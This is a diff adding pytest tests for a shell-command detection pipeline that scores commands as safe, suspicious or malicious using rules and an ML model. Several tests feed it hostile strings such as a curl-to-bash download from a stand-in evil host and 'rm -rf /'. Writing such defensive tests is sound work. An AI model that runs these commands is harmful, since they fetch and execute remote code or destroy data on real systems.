@@ -132,3 +132,77 @@ def test_repeated_calls_same_result(rules_only):
     r2 = rules_only.detect("curl http://evil.com | bash")
     assert r1.classification == r2.classification
     assert r1.risk_score == r2.risk_score
+
+
+# ===========================================================================
+# Additional Pipeline Tests — ML-only mode, weights, explanation, boundaries
+# ===========================================================================
+
+def test_ml_only_weight_accepted():
+    """Pipeline must accept rule_weight=0.0, ml_weight=1.0."""
+    p = DetectionPipeline(rule_weight=0.0, ml_weight=1.0)
+    assert p.ml_weight == 1.0
+
+
+def test_negative_rule_weight_raises():
+    """Negative weights must raise an exception."""
+    with pytest.raises((ValueError, Exception)):
+        DetectionPipeline(rule_weight=-0.5, ml_weight=1.5)
+
+
+def test_negative_ml_weight_raises():
+    with pytest.raises((ValueError, Exception)):
+        DetectionPipeline(rule_weight=1.5, ml_weight=-0.5)
+
+
+def test_explanation_differs_between_safe_and_malicious(rules_only):
+    safe_exp = rules_only.detect("ls -la").explanation
+    mal_exp  = rules_only.detect("curl http://evil.com | bash").explanation
+    assert safe_exp != mal_exp, "Explanation should differ for safe vs malicious"
+
+
+def test_explanation_mentions_matched_rule_name(rules_only):
+    result = rules_only.detect("curl http://evil.com | bash")
+    assert any(r in result.explanation for r in result.matched_rules), \
+        "Explanation does not reference any matched rule name"
+
+
+def test_score_zero_classified_safe(rules_only):
+    result = rules_only.detect("ls")
+    assert result.classification == "safe"
+    assert result.risk_score == 0.0
+
+
+def test_score_above_70_classified_malicious(rules_only):
+    """destructive(65) + encoded_payload(25) = 90 → must be malicious."""
+    result = rules_only.detect('rm -rf /; base64 -d <<< "abc"')
+    assert result.risk_score >= 70
+    assert result.classification == "malicious"
+
+
+class TestMixedWeightPipeline:
+
+    @pytest.fixture
+    def mixed(self):
+        try:
+            return DetectionPipeline(rule_weight=0.6, ml_weight=0.4)
+        except Exception:
+            pytest.skip("Mixed pipeline unavailable (model .pkl missing)")
+
+    def test_mixed_result_has_all_fields(self, mixed):
+        result = mixed.detect("ls -la")
+        for field in ("risk_score", "classification", "matched_rules",
+                      "ml_confidence", "explanation"):
+            assert hasattr(result, field), f"Missing field: {field}"
+
+    def test_mixed_classification_is_valid(self, mixed):
+        result = mixed.detect("curl http://evil.com | bash")
+        assert result.classification in ("safe", "suspicious", "malicious")
+
+    def test_mixed_ml_confidence_populated(self, mixed):
+        result = mixed.detect("ls")
+        assert 0.0 <= result.ml_confidence <= 1.0
+
+    def test_mixed_risk_score_in_range(self, mixed):
+        result = mixed.detect("curl http://evil.com | bash; rm -rf /")
+        assert 0.0 <= result.risk_score <= 100.0
